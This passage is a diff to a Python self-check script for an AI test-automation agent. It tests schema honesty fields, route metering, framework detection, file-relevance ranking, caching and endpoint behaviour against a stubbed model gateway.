@@ -4545,6 +4545,1327 @@ def main():
         llm_gateway.call_tool = _prev33
 
 
+    # ── 34 ────────────────────────────────────────────────────────────────
+    section("34. Test automation: four doors, and the honesty that makes it worth having")
+
+    from backend.services import test_context_brief as _tcb34
+    from backend.services import source_bundle as _sb34
+    from backend.services import legacy_guard as _lg34
+    from backend.agents.qa_intelligence import test_automation_agent as _taa34
+    import backend.main as _m34
+
+    # -- the reserved-field collision, which broke a renderer and hid a warning ----
+    #
+    # `result.coverage` is chunk coverage platform-wide (`{chunks_total, ...}`) and the
+    # shared `renderReviewTransparency` reads it. This agent's per-requirement coverage
+    # shadowed it: the screen crashed on a partial run, and — worse — a Green gate over an
+    # incomplete review stopped saying it was incomplete. Asserted as a property so the
+    # name cannot drift back.
+    _props34 = _taa34.TEST_AUTOMATION_TOOL_SCHEMA["input_schema"]["properties"]
+    check("the suite's coverage does not shadow the platform's coverage field",
+          "coverage" not in _props34 and "requirement_coverage" in _props34,
+          f"{sorted(_props34)} -- `coverage` is chunk coverage read by "
+          "renderReviewTransparency; shadowing it silences the partial-review warning")
+    check("...and every requirement is asked for, covered or not",
+          "requirement_coverage" in _taa34.TEST_AUTOMATION_TOOL_SCHEMA["input_schema"]["required"],
+          "a suite that lists only what it covered cannot be read for gaps")
+    check("...and the two honesty fields are required, not optional",
+          {"assumptions", "not_automated"} <=
+          set(_taa34.TEST_AUTOMATION_TOOL_SCHEMA["input_schema"]["required"]),
+          "an assumptions list the model may omit is the C-66 failure mode: a green suite "
+          "that proves nothing, with nothing saying which guesses it rests on")
+
+    # -- metering: runs billed, quotes free -------------------------------
+    check("both run doors are metered as the product",
+          all(_lg34.product_for_request("POST", p) == "test-automation" for p in (
+              "/api/review/test-automation",
+              "/api/review/test-automation/upload-zip")),
+          "an unmapped route is entitled to nobody and billed to nothing (D-289)")
+    check("...and neither quote door is, because a quote spends nothing",
+          all(_lg34.product_for_request("POST", p) is None for p in (
+              "/api/review/test-automation/preflight",
+              "/api/review/test-automation/preflight-zip")),
+          "refusing to quote somebody near their cap tells them less than the quote would")
+    check("...and it is not a fan-out, because it makes one call",
+          "/api/review/test-automation" not in set(_lg34._CHUNKABLE_ROUTES),
+          "one coherent suite has no merge rule across chunks; listed here it would "
+          "reserve for twenty calls and make one, denying calls that would have succeeded")
+
+    # -- the conventions brief: the D-316 mitigation ----------------------
+    class _B34:
+        def __init__(self, files):
+            self.files = files
+            self.source_type, self.label, self.ref = "files", "s34", ""
+            self.truncated, self.truncation_reason = False, ""
+            self.untrusted_label, self.skipped, self.stats = "", [], {}
+            self.is_diff, self.suppression, self.meta = False, None, {}
+
+        def summary(self):
+            return {"source_type": "files", "files_reviewed": len(self.files)}
+
+    _real34 = _B34([
+        {"path": "conftest.py",
+         "content": "import pytest\nfrom fastapi.testclient import TestClient\n"
+                    "from app.main import app\n\n@pytest.fixture\ndef client():\n"
+                    "    return TestClient(app)\n"},
+        {"path": "tests/test_checkout.py",
+         "content": "import pytest\n\ndef test_ok(client):\n"
+                    "    assert client.post('/checkout').status_code == 200\n"},
+        {"path": "tests/test_slug.py", "content": "def test_slug():\n    assert 1\n"},
+    ])
+    _brief34 = _tcb34.build(_real34)
+    check("the brief finds the project's own tests",
+          _brief34["has_tests"] and _brief34["test_files"] == 2,
+          f"{_brief34['test_files']} found -- without them the agent invents an idiom (D-316)")
+    check("...and the framework they actually use",
+          _brief34["frameworks"] == {"pytest": 1}, str(_brief34["frameworks"]))
+    check("...and where the client is built, which is usually not in a test file",
+          any(r["idiom"] == "FastAPI/Starlette TestClient" and r["path"] == "conftest.py"
+              for r in _brief34["client_idioms"]),
+          f"{_brief34['client_idioms']} -- scanning only test files reported no idiom at "
+          "all for a textbook pytest project, blanking the most useful section")
+    check("...and quotes the integration test before the unit test",
+          _brief34["exemplar_paths"][:1] == ["tests/test_checkout.py"],
+          f"{_brief34['exemplar_paths']} -- a test that goes through a client teaches the "
+          "idiom a requirement-driven test needs; a two-line unit test does not")
+
+    # A file named like a pytest test that is not one. Three product files in this very
+    # repository satisfy the naming convention (`test_context_brief.py` and the two QA
+    # agents), and reporting them as the project's suite is how a brief comes to describe
+    # a convention that does not exist.
+    check("a file named like a test but declaring none is not counted",
+          _tcb34.build(_B34([{"path": "svc/test_helpers.py",
+                              "content": "def build():\n    return 1\n"}]))["test_files"] == 0,
+          "pytest's test_*.py convention is legal for any module")
+    check("...but one that declares a test is",
+          _tcb34.build(_B34([{"path": "test_orders.py",
+                              "content": "def test_total():\n    assert 1\n"}]))["test_files"] == 1)
+    # Found by running the brief against a real Jest repository (taskflow-api): `describe`,
+    # `it` and `expect` are **globals** under Jest, Mocha and Vitest, so an ordinary suite
+    # imports nothing any text marker can see and the brief reported "no framework is
+    # confirmed" for a project whose package.json plainly said `jest`. The manifest is the
+    # exact answer where a pattern was a guess.
+    _js34 = _tcb34.build(_B34([
+        {"path": "package.json", "content": '{"scripts":{"test":"jest"},'
+                                            '"devDependencies":{"jest":"^29.7.0",'
+                                            '"supertest":"^6.3.3"}}'},
+        {"path": "tests/tasks.test.js",
+         "content": "const request = require('supertest');\nconst app = require('../src/app');\n"
+                    "describe('tasks', () => {\n  it('creates a task', async () => {\n"
+                    "    const r = await request(app).get('/tasks');\n"
+                    "    expect(r.status).toBe(200);\n  });\n});\n"},
+    ]))
+    check("a JavaScript runner is read from the manifest, not guessed from imports",
+          "Jest" in (_js34["declared_frameworks"] or []),
+          f"{_js34['declared_frameworks']} -- Jest/Mocha/Vitest inject describe/it/expect as "
+          "globals, so no import-based marker can ever fire for an ordinary suite")
+    check("...and the note says which claim is which",
+          "manifest declares" in _js34["note"] and "globals" in _js34["note"],
+          f"{_js34['note'][:200]!r} -- 'declared in package.json' is an exact claim and "
+          "'imported by three files' is an inferred one; collapsing them loses that")
+    check("...while a project declaring nothing still says so",
+          "no framework is confirmed" in _tcb34.build(_B34([
+              {"path": "tests/t.js",
+               "content": "describe('x', () => { it('y', () => {}); });\n"}]))["note"])
+
+    check("a framework is claimed only on an import or a call, never a mention",
+          not _tcb34.build(_B34([{"path": "tests/t.py",
+                                  "content": "# we should use cypress and rspec one day\n"
+                                             "def test_x():\n    assert 1\n"}]))["frameworks"],
+          "bare substrings matched this module's own marker table and reported a "
+          "Python/SQLite application as using Cypress and RSpec")
+
+    _none34 = _tcb34.build(_B34([{"path": "app/main.py", "content": "print(1)\n"}]))
+    check("a project with no tests gets an honest blank, not a guess",
+          not _none34["has_tests"] and "no established idiom" in _none34["note"],
+          f"{_none34['note'][:160]!r} -- this is the case where a generated suite is least "
+          "likely to run, so it is the case that must say so")
+    check("...and is told to declare its assumptions instead",
+          "assumption" in _none34["note"].lower())
+
+    # -- the three input modes, and saying which one happened -------------
+    _src34 = _tcb34.for_automation(_real34)
+    check("a small source is sent verbatim, so tests can name real functions",
+          _src34["mode"] == "source" and "===== FILE: conftest.py =====" in _src34["markdown"],
+          f"mode={_src34['mode']}")
+    _desc34 = _tcb34.for_automation(_real34, max_inline_source=10)
+    check("a codebase too large to send, with no requirement to rank by, is described alone",
+          _desc34["mode"] == "description", f"mode={_desc34['mode']}")
+    check("...and says so, rather than letting the caller assume it was read",
+          "no requirement was supplied" in _desc34["mode_note"],
+          f"{_desc34['mode_note'][:160]!r} -- a caller who supplies the requirement gets the "
+          "files it names quoted verbatim, and that is worth telling them")
+    check("...and the described mode says the difference out loud",
+          "guess" in _desc34["markdown"] and "assumptions" in _desc34["markdown"],
+          "a suite built from a description is a weaker artifact than one built from "
+          "source, and a reader who cannot tell them apart trusts both equally")
+
+    # -- the briefs are computed once per codebase, not once per request --
+    #
+    # Both builders are pure functions of the file paths and contents they read, and both
+    # are slow on a real repository: 2.6s and 9.3s on this repo's own backend. Every
+    # code-reading product computes them twice for one generation -- once for the free
+    # preflight, which is how a user decides whether to spend, and again for the run, on
+    # byte-identical input. The cache removes a wait that was never doing any work; it
+    # changes no answer, and these checks are here to prove that rather than assert it.
+    from backend.services import brief_cache as _bc34
+    _bc34.clear()
+    _fresh34 = _tcb34.build(_real34)
+    _n0 = _bc34.stats()
+    _cached34 = _tcb34.build(_real34)
+    _n1 = _bc34.stats()
+    check("the same codebase is not analysed twice",
+          _n1["hits"] == _n0["hits"] + 1, f"{_n0} then {_n1}")
+    check("...and the cached brief is identical to a freshly computed one",
+          _cached34 == _fresh34,
+          "a cache that returns a different answer is worse than no cache")
+    check("...and a different codebase is analysed rather than guessed at",
+          (_tcb34.build(_B34([{"path": "other.py", "content": "def f():\n    pass\n"}]))
+           and _bc34.stats()["misses"] > _n1["misses"]),
+          f"{_bc34.stats()} -- the key is a content hash, so different content must miss")
+
+    # `repo_ingest` promises no file order, and the brief does not depend on one. Keying on
+    # order would mean a re-clone of the same commit missed its own entry.
+    _rev34 = _B34(list(reversed(_real34.files)))
+    _n2 = _bc34.stats()
+    _tcb34.build(_rev34)
+    check("...while the same files in a different order share one entry",
+          _bc34.stats()["hits"] == _n2["hits"] + 1, f"{_n2} then {_bc34.stats()}")
+
+    # The size limit changes the brief, so it has to change the key. Colliding here would
+    # serve a 40,000-character brief to a caller who asked for 200.
+    _n3 = _bc34.stats()
+    _tcb34.build(_real34, max_chars=200)
+    check("...but a different size limit is a different brief, not a collision",
+          _bc34.stats()["misses"] == _n3["misses"] + 1, f"{_n3} then {_bc34.stats()}")
+
+    # Entries are shared, so a caller that mutates what it got back would corrupt every
+    # later reader. The top level is copied on the way out for exactly that reason.
+    _mine34 = _tcb34.build(_real34)
+    _mine34["has_tests"] = "tampered"
+    check("...and one caller cannot corrupt the entry for the next",
+          _tcb34.build(_real34)["has_tests"] is True,
+          "a shared cache handing out its own dict is one bad caller away from a wrong brief")
+    _bc34.clear()
+    check("the cache can be emptied, so one test cannot inherit another's entries",
+          _bc34.stats() == {"hits": 0, "misses": 0, "entries": 0}, str(_bc34.stats()))
+
+    # -- relevance ranking: which files a requirement is actually about ---
+    #
+    # The property under test is the one D-384 exists for: a codebase too large to send used
+    # to send *nothing* verbatim, so the agent guessed exactly the route paths and signatures
+    # a test asserts on. Ranking has to put the requirement's own files first and drag in
+    # what they import -- the imported file is the one that scores zero on its own and
+    # matters most, because a test's import line is a guess without it.
+    _rank34 = [
+        {"path": "src/app.js",
+         "content": "const tasks = require('./routes/tasks');\napp.use('/tasks', tasks);\n"},
+        {"path": "src/routes/tasks.js",
+         "content": "const auth = require('../middleware/auth');\n"
+                    "router.put('/:id', auth, (req, res) => res.json(task));\n"},
+        {"path": "src/middleware/auth.js",
+         "content": "module.exports = (req, res, next) => "
+                    "{ req.headers.authorization.split(' ')[1]; };\n"},
+        {"path": "src/routes/billing.js", "content": "router.post('/invoice', () => {});\n"},
+        {"path": "docs/notes.md", "content": "# notes\n"},
+    ]
+    _req34 = ("A task may only be updated or deleted by the user who created it. "
+              "PUT /tasks/:id returns 403 for anyone else.")
+    _sel34 = _tcb34.select_files(_rank34, _req34, budget=100_000)
+    check("the file the requirement names ranks first",
+          _sel34["selected_paths"][:1] == ["src/routes/tasks.js"],
+          f"{_sel34['selected_paths']} -- if the route file is not first, the budget is spent "
+          "on files the requirement is not about")
+    check("...and what it imports comes with it, though it matches no requirement word",
+          "src/middleware/auth.js" in _sel34["selected_paths"],
+          f"{_sel34['selected_paths']} -- auth.js scores zero on its own; without the "
+          "dependency hop the generated test imports a file the agent never saw (D-316)")
+    check("...and the entry point too, because a test needs the app to make a request against",
+          "src/app.js" in _sel34["selected_paths"], str(_sel34["selected_paths"]))
+    check("...and an unrelated file is left out",
+          "src/routes/billing.js" not in _sel34["selected_paths"],
+          f"{_sel34['selected_paths']} -- selecting everything is what this replaces")
+    check("every selected file carries the reason it was selected",
+          all(row.get("why") for row in _sel34["selected"]),
+          "a ranking nobody can inspect is a ranking nobody can correct, and this one is "
+          "shown on the quote before any spend")
+    check("a prose requirement matches a plural filename",
+          "tasks" in _tcb34.requirement_terms("the task must be deleted"),
+          "requirements are written in the singular and files are named in the plural; "
+          "matching one form only is how the most relevant file in a repository scores zero")
+    check("a camelCase filename matches a two-word requirement phrase",
+          set(_tcb34._split_identifier("taskOwnership")) == {"task", "ownership"},
+          str(_tcb34._split_identifier("taskOwnership")))
+    # -- rarity: a common word must not outrank a precise one ------------
+    #
+    # Found on a live preflight against this repository. Asked for "a truncated **model**
+    # response must not be stored as a clean Green gate", the flat scorer put
+    # `models/api_models.py` and `models/swarm_models.py` first -- "model" matched the
+    # `models/` directory -- when the requirement meant an LLM and the file meant a schema.
+    # A word in half the files cannot discriminate; a word in two files almost always can.
+    _idf34 = [
+        {"path": "src/models/user.js", "content": "// model model model\nclass User {}\n"},
+        {"path": "src/models/order.js", "content": "// model\nclass Order {}\n"},
+        {"path": "src/models/cart.js", "content": "// model\nclass Cart {}\n"},
+        {"path": "src/billing/refund.js", "content": "// model\nfunction refund() {}\n"},
+    ]
+    _w34 = _tcb34.term_weights(_idf34, {"model", "refund"})
+    check("a word in every file is worth less than a word in one",
+          _w34["refund"] > _w34["model"] * 3,
+          f"model={_w34['model']:.2f} refund={_w34['refund']:.2f} -- flat scoring let the "
+          "commonest word in the codebase decide which files the money was spent on")
+    check("...so the precise file outranks the one that merely shares the common word",
+          _tcb34.select_files(_idf34, "issue a refund to the customer",
+                              budget=100_000)["selected_paths"][:1]
+          == ["src/billing/refund.js"],
+          str(_tcb34.select_files(_idf34, "issue a refund", budget=100_000)["selected_paths"]))
+    check("a word this codebase never uses is not a search term at all",
+          "refunds" not in _tcb34.term_weights(_idf34, {"refunds"}),
+          "`requirement_terms` pluralises everything to bridge prose and code, which invents "
+          "words: 'empty' produced 'emptys'. Scored as maximally rare they head the rarity "
+          "table a user is shown, which is nonsense presented as evidence")
+
+    # -- no single file may crowd out the rest ----------------------------
+    #
+    # Also live: a 66,000-character file ranked second on a filename match and took 55% of
+    # the budget, pushing out four smaller files closer to the requirement.
+    _fat34 = [
+        {"path": "idempotent.js", "content": "// idempotent checkout guard\nexport const k=1;\n"},
+        {"path": "audit.js", "content": "x" * 63_000},
+        {"path": "notify.js", "content": "export function notify() {}\n"},
+    ]
+    _cap34 = _tcb34.select_files(
+        _fat34, "a repeated checkout must be idempotent; every attempt is written to audit "
+                "and the customer is sent a notify message",
+        budget=30_000)
+    check("one large file cannot take the whole budget",
+          "notify.js" in _cap34["selected_paths"] and "audit.js" not in _cap34["selected_paths"],
+          f"{_cap34['selected_paths']} -- a big mediocre match must not crowd out several "
+          "small precise ones")
+    check("...and a file left out for size is named, not silently dropped",
+          "audit.js" in _cap34["omitted_for_budget"],
+          f"{_cap34['omitted_for_budget']} -- a reader who can see what was left out can "
+          "narrow the source; one who cannot just gets worse tests")
+
+    check("a third-party import resolves to nothing rather than a wrong file",
+          _tcb34.referenced_paths(
+              "src/a.js", "const express = require('express');\n",
+              _tcb34._path_index(_rank34)) == [],
+          "`express` is not a file in this repository, and resolving it to one would spend "
+          "the budget on a file the author never wrote")
+
+    # -- hybrid: the map of everything, plus the code that matters --------
+    _big34 = _B34(_rank34 + [{"path": f"src/pad{i}.js", "content": "filler " * 3000}
+                             for i in range(8)])
+    _hyb34 = _tcb34.for_automation(_big34, requirement=_req34,
+                                   max_inline_source=5_000, max_hybrid_source=4_000)
+    check("a codebase too large to send whole still sends the files that matter",
+          _hyb34["mode"] == "hybrid", f"mode={_hyb34['mode']}")
+    check("...quoting them verbatim",
+          "===== FILE: src/routes/tasks.js =====" in _hyb34["markdown"],
+          "the point of the mode is that the tests can name a real route")
+    check("...alongside a structural description of everything else",
+          "Every file, what it declares" in _hyb34["markdown"],
+          "without the map the agent cannot tell what it was not shown")
+    check("...and says plainly that what it did not see is a guess",
+          "guess" in _hyb34["markdown"] and "assumptions" in _hyb34["markdown"])
+    check("...and costs a fraction of the whole codebase",
+          _hyb34["prompt_chars"] < _hyb34["source_chars"] / 4,
+          f"{_hyb34['prompt_chars']:,} of {_hyb34['source_chars']:,}")
+
+    # -- focus: the cost lever, and the case where it must decline --------
+    #
+    # A control that raises the cost is a control that lies. On a small codebase the
+    # structural description is longer than the source it would replace, so narrowing sends
+    # *more* characters and shows *less* code -- the worst of both, and silently.
+    _focus34 = _tcb34.for_automation(_real34, requirement="checkout", focus=True)
+    check("narrowing a codebase that already fits, and would not save, is declined",
+          _focus34["mode"] == "source",
+          f"mode={_focus34['mode']} -- a cost control that raises the cost is a lie")
+    check("...and says why, rather than silently ignoring the request",
+          "Narrowing was requested" in _focus34["mode_note"],
+          f"{_focus34['mode_note'][-160:]!r} -- there are two reasons to decline (nothing "
+          "rankable, or no saving) and either is fine; silence is not")
+    # A pasted artifact has no filename (`from_text` gives it an empty path), so nothing can
+    # be ranked against the requirement. Falling to `description` there would throw away
+    # source that fits — the same class of defect that once made a paste report "no readable
+    # files were found", arriving through a new door.
+    _paste34 = _tcb34.for_automation(
+        _sb34.from_text("from fastapi import FastAPI\napp = FastAPI()\n", "pasted"),
+        requirement="only the owner may export", focus=True)
+    check("narrowing a pasted artifact sends it whole rather than describing it",
+          _paste34["mode"] == "source",
+          f"mode={_paste34['mode']} -- a paste has no filename to rank, and dropping the one "
+          "file the user actually supplied is the worst available answer")
+    check("...and no mode ever claims a small source was too large",
+          "too large" not in _paste34["mode_note"], _paste34["mode_note"][:160])
+
+    _focusbig34 = _tcb34.for_automation(_big34, requirement=_req34, focus=True,
+                                        max_focus_source=4_000)
+    check("...but a codebase where it does save is narrowed as asked",
+          _focusbig34["mode"] == "hybrid"
+          and _focusbig34["prompt_chars"] < _focusbig34["source_chars"],
+          f"mode={_focusbig34['mode']} "
+          f"{_focusbig34['prompt_chars']:,} of {_focusbig34['source_chars']:,}")
+    check("...and never sends a half file, whatever the budget",
+          all(row["chars"] == len(next(f["content"] for f in _rank34
+                                       if f["path"] == row["path"]))
+              for row in _focusbig34["selection"]["selected"]
+              if any(f["path"] == row["path"] for f in _rank34)),
+          "a model cannot tell it is reading half of something, so it reasons about the "
+          "missing half as though it had seen it -- which is D-316 exactly")
+
+    # The exemplars are already quoted verbatim by the conventions brief; spending the source
+    # budget to say the same thing twice is the one duplication that costs accuracy.
+    _dup34 = _tcb34.for_automation(
+        _B34(_rank34 + [{"path": "tests/test_tasks.py",
+                         "content": "def test_task(client):\n    assert client.put('/tasks/1')\n"}]
+             + [{"path": f"src/pad{i}.js", "content": "filler " * 3000} for i in range(8)]),
+        requirement=_req34, max_inline_source=5_000, max_hybrid_source=6_000)
+    check("a file already quoted as an exemplar is not quoted a second time",
+          all(p not in _dup34["selection"]["selected_paths"]
+              for p in _dup34["conventions"]["exemplar_paths"]),
+          f"selected={_dup34['selection']['selected_paths']} "
+          f"exemplars={_dup34['conventions']['exemplar_paths']}")
+
+    # -- the four doors, driven for real, with the gateway stubbed --------
+    _calls34 = []
+
+    def _fake34(system_prompt, user_content, schema, override=None, max_tokens=None, **kw):
+        _calls34.append(schema.get("name", ""))
+        return {
+            "levels_chosen": [{"level": "API/Integration", "rationale": "an HTTP route"}],
+            "test_files": [{
+                "path": "tests/test_export_authz.py", "framework": "pytest",
+                "level": "API/Integration", "prerequisites": ["running application", "database"],
+                "content": "def test_denied(client):\n    assert client.get('/x').status_code == 403\n",
+                "test_names": ["test_denied"], "covers": ["treating-clinician-only export"],
+            }],
+            "requirement_coverage": [
+                {"requirement_ref": "treating-clinician-only export", "covered": True,
+                 "test_names": ["test_denied"]},
+                {"requirement_ref": "the button is hidden", "covered": False,
+                 "note": "needs the markup"},
+            ],
+            "not_automated": [{"requirement_ref": "the button is hidden",
+                               "reason": "a visual assertion with no markup supplied"}],
+            "assumptions": [{"assumption": "client fixture exists",
+                             "why_unverifiable": "conftest was supplied, so low risk",
+                             "risk_if_wrong": "every test fails at setup"}],
+            "setup_instructions": "pip install -r requirements.txt && pytest",
+            "summary": "One integration test file.",
+        }
+
+    _prev34 = llm_gateway.call_tool
+    llm_gateway.call_tool = _fake34
+    _m34.llm_settings_service.is_llm_configured = lambda: True
+    try:
+        from fastapi.testclient import TestClient as _TC34
+        with _TC34(_m34.app, raise_server_exceptions=False) as _c34:
+            _tok34 = _c34.post("/api/auth/login",
+                               json={"username": "admin",
+                                     "password": config.DEFAULT_ADMIN_PASSWORD}).json()["token"]
+            _pid34 = _c34.post("/api/v1/projects", json={"name": "S34"},
+                               headers={"Authorization": f"Bearer {_tok34}"}
+                               ).json()["project"]["id"]
+            _H34 = {"Authorization": f"Bearer {_tok34}", "X-Project-Id": _pid34}
+            _body34 = {
+                "requirement": "Only the treating clinician may export a visit history.",
+                "files": [{"path": p["path"], "content": p["content"]} for p in _real34.files],
+                "levels": ["API/Integration"],
+            }
+
+            _n34 = len(_calls34)
+            _q34 = _c34.post("/api/review/test-automation/preflight",
+                             json=_body34, headers=_H34)
+            check("the quote answers", _q34.status_code == 200,
+                  f"{_q34.status_code} {_q34.text[:200]}")
+            check("...and calls no model", len(_calls34) == _n34,
+                  "a free preflight that spends is not free")
+            _qj34 = _q34.json() if _q34.status_code == 200 else {}
+            check("...and names a ceiling a person can approve against",
+                  (_qj34.get("estimate") or {}).get("ceiling_usd", 0) > 0,
+                  str(_qj34.get("estimate"))[:160])
+            check("...and says which input mode the money buys",
+                  _qj34.get("input_mode") == "source",
+                  f"{_qj34.get('input_mode')} -- it changes how good the tests can be, so "
+                  "it belongs on the quote and not only on the result")
+            check("...and how this project already tests itself, before any spend",
+                  (_qj34.get("test_conventions") or {}).get("has_tests") is True,
+                  str(_qj34.get("test_conventions"))[:160])
+
+            # A quote does not require the requirement, on purpose: someone pricing the job
+            # before writing it should not have to invent one to get a number.
+            check("a quote is given without a requirement",
+                  _c34.post("/api/review/test-automation/preflight",
+                            json={k: v for k, v in _body34.items() if k != "requirement"},
+                            headers=_H34).status_code == 200,
+                  "pricing the job is how you decide whether to write the requirement")
+
+            # `focus` on the wire, priced free, before anything is spent. The screen shows
+            # which files it picked and why, so a wrong pick is visible on the quote rather
+            # than inferred from bad tests an hour later.
+            _n34 = len(_calls34)
+            _f34 = _c34.post("/api/review/test-automation/preflight",
+                             json={**_body34, "focus": True}, headers=_H34)
+            check("narrowing is accepted on the quote", _f34.status_code == 200,
+                  f"{_f34.status_code} {_f34.text[:200]}")
+            check("...and still calls no model", len(_calls34) == _n34)
+            _fj34 = _f34.json() if _f34.status_code == 200 else {}
+            check("...and reports what narrowing did, not just that it was asked for",
+                  isinstance(_fj34.get("input_selection"), dict)
+                  and "selected_paths" in _fj34["input_selection"],
+                  str(_fj34.get("input_selection"))[:200])
+            check("...declining on a codebase where narrowing cannot help, and saying so",
+                  _fj34.get("input_mode") == "source"
+                  and "Narrowing was requested" in (_fj34.get("input_mode_note") or ""),
+                  f"{_fj34.get('input_mode')} {(_fj34.get('input_mode_note') or '')[-120:]!r} "
+                  "-- the source fits, so throwing it away for a description would be the "
+                  "worst available answer whatever the reason narrowing failed")
+
+            # The quote must describe the prompt the run will send. A requirement changes
+            # which files are quoted verbatim, so a quote that ignored it would price a
+            # different call from the one that happens -- and a quote is believed.
+            _sel_q34 = _c34.post(
+                "/api/review/test-automation/preflight",
+                json={**_body34, "focus": True,
+                      "requirement": "checkout must reject an expired card"},
+                headers=_H34).json()
+            check("the requirement reaches the ranking, not just the prompt",
+                  isinstance((_sel_q34.get("input_selection") or {}).get("considered"), int),
+                  str(_sel_q34.get("input_selection"))[:200])
+
+            _n34 = len(_calls34)
+            _r34 = _c34.post("/api/review/test-automation", json=_body34, headers=_H34)
+            check("the run answers", _r34.status_code == 200,
+                  f"{_r34.status_code} {_r34.text[:300]}")
+            check("...in exactly one model call",
+                  len(_calls34) - _n34 == 1, f"{len(_calls34) - _n34} calls")
+            _rj34 = _r34.json() if _r34.status_code == 200 else {}
+            check("...storing a review of its own type",
+                  _rj34.get("review_id") and _rj34.get("total_files") == 1,
+                  str(_rj34)[:200])
+            check("...counting the tests itself rather than trusting the model",
+                  _rj34.get("total_tests") == 1, str(_rj34.get("total_tests")))
+            check("...and the result records what the agent was actually shown",
+                  isinstance(_rj34.get("input_selection"), dict)
+                  and _rj34.get("input_mode") in ("source", "hybrid", "description"),
+                  f"mode={_rj34.get('input_mode')} sel={str(_rj34.get('input_selection'))[:120]} "
+                  "-- a stored suite is read months later by somebody who cannot re-run the "
+                  "quote, and how much code the agent saw is how much the suite is worth")
+            check("...and reporting the requirement it did NOT cover",
+                  _rj34.get("uncovered_count") == 1,
+                  f"{_rj34.get('uncovered_count')} -- a suite that lists only its successes "
+                  "reads as complete coverage")
+            check("...and never claiming the tests were run",
+                  _rj34.get("execution_status") == "not_executed",
+                  f"{_rj34.get('execution_status')} -- nothing in this pipeline compiles or "
+                  "runs what it produces (D-05), and silence would let a reader assume it did")
+
+            # A codebase with nothing to say what to test is a 400, not a suite invented
+            # from whatever the repository happened to contain.
+            check("a codebase with no requirement and no cases is refused",
+                  _c34.post("/api/review/test-automation",
+                            json={k: v for k, v in _body34.items() if k != "requirement"},
+                            headers=_H34).status_code == 400,
+                  "a codebase on its own does not say what to test")
+            check("...and a source with nothing readable in it is too",
+                  _c34.post("/api/review/test-automation",
+                            json={"requirement": "x", "files": []},
+                            headers=_H34).status_code == 400)
+
+            # The zip pair. It exists because the browser screen uploads an archive, and a
+            # quote available only on the JSON API is a quote no actual user ever sees.
+            _zip34 = io.BytesIO()
+            with zipfile.ZipFile(_zip34, "w") as _zf34:
+                for _f34 in _real34.files:
+                    _zf34.writestr(_f34["path"], _f34["content"])
+            _bytes34 = _zip34.getvalue()
+
+            _n34 = len(_calls34)
+            _zq34 = _c34.post("/api/review/test-automation/preflight-zip",
+                              files={"file": ("src.zip", _bytes34, "application/zip")},
+                              data={"requirement": "Only the treating clinician may export."},
+                              headers=_H34)
+            check("an uploaded archive can be quoted too",
+                  _zq34.status_code == 200, f"{_zq34.status_code} {_zq34.text[:200]}")
+            check("...still calling no model", len(_calls34) == _n34)
+
+            _n34 = len(_calls34)
+            _zr34 = _c34.post("/api/review/test-automation/upload-zip",
+                              files={"file": ("src.zip", _bytes34, "application/zip")},
+                              data={"requirement": "Only the treating clinician may export.",
+                                    "levels": "API/Integration"},
+                              headers=_H34)
+            check("...and run", _zr34.status_code == 200,
+                  f"{_zr34.status_code} {_zr34.text[:300]}")
+            check("...in one call, like the JSON door",
+                  len(_calls34) - _n34 == 1, f"{len(_calls34) - _n34} calls")
+            check("a non-zip upload is refused rather than parsed",
+                  _c34.post("/api/review/test-automation/upload-zip",
+                            files={"file": ("notes.txt", b"hello", "text/plain")},
+                            data={"requirement": "x"}, headers=_H34).status_code == 400)
+
+            # The degeneracy guard. Neither QA agent goes through `attest`, so a truncated
+            # response returning no files must raise rather than store an empty suite as a
+            # successful generation.
+            llm_gateway.call_tool = lambda *a, **k: {"test_files": [], "summary": ""}
+            check("a response with no files and no summary is an error, not a clean result",
+                  _c34.post("/api/review/test-automation", json=_body34,
+                            headers=_H34).status_code >= 500,
+                  "storing it reads as 'we generated a suite' when nothing came back")
+
+            # A schema is a request, not a guarantee. On a live run against a large
+            # codebase the model returned `test_files` as a list of **strings**; the
+            # orchestrator called `.get()` on a string and the caller received an HTTP 500
+            # carrying an AttributeError -- after the call had been made and billed. A row
+            # of the wrong shape must not be able to reach the arithmetic.
+            llm_gateway.call_tool = lambda *a, **k: {
+                "test_files": ["tests/test_thing.py", {"path": "tests/test_real.py",
+                                                       "framework": "pytest", "level": "Unit",
+                                                       "content": "def test_x():\n    assert 1\n",
+                                                       "test_names": ["test_x"], "covers": ["r1"],
+                                                       "prerequisites": ["none"]}],
+                "requirement_coverage": ["not an object", {"requirement_ref": "r1",
+                                                           "covered": False}],
+                "assumptions": ["bare string"],
+                "not_automated": ["bare string"],
+                "summary": "one real file and several malformed rows",
+            }
+            _mal34 = _c34.post("/api/review/test-automation", json=_body34, headers=_H34)
+            check("a model row of the wrong shape is dropped, not crashed on",
+                  _mal34.status_code == 200,
+                  f"{_mal34.status_code} {_mal34.text[:220]} -- the call is already paid for "
+                  "by the time the response is parsed, so a malformed row must not turn a "
+                  "spent generation into a 500")
+            _mj34 = _mal34.json() if _mal34.status_code == 200 else {}
+            check("...and only the well-formed rows are counted",
+                  _mj34.get("total_files") == 1 and _mj34.get("total_tests") == 1,
+                  f"files={_mj34.get('total_files')} tests={_mj34.get('total_tests')}")
+            check("...and the arithmetic over the other arrays survives it too",
+                  _mj34.get("uncovered_count") == 1
+                  and _mj34.get("assumption_count") == 0
+                  and _mj34.get("not_automated_count") == 0,
+                  f"uncovered={_mj34.get('uncovered_count')} "
+                  f"assumptions={_mj34.get('assumption_count')} "
+                  f"not_automated={_mj34.get('not_automated_count')}")
+            check("...and what was discarded is reported rather than silently dropped",
+                  _mj34.get("malformed_rows") == 4, str(_mj34.get("malformed_rows")))
+
+            # All rows malformed is malformed, not empty -- and the degeneracy error is the
+            # one that says so.
+            llm_gateway.call_tool = lambda *a, **k: {"test_files": ["a", "b"], "summary": ""}
+            check("a response whose every row is the wrong shape is an error, not an empty suite",
+                  _c34.post("/api/review/test-automation", json=_body34,
+                            headers=_H34).status_code >= 500)
+    finally:
+        llm_gateway.call_tool = _prev34
+
+    # ══ 35. Results come back, and the claim is checked against them ═══════
+    #
+    # Phase 2. Until this existed, `requirement_coverage` was the model's *claim* that a
+    # rule was covered and nothing could contradict it. The verdict that matters most is
+    # the one that could not exist before: `not_run` -- a requirement the generation said
+    # it covered, for which nothing that actually ran can be found.
+    #
+    # Nothing here runs a test (D-05). These rows are claims by whoever posted them, and
+    # the checks below assert that the platform says so rather than presenting a reported
+    # pass as proof.
+    section("35. Test results come back, and check the coverage the model claimed")
+
+    from backend.services import test_results as _tr35
+
+    _xml35 = ("<testsuites><testsuite name=\"pytest\" tests=\"4\">"
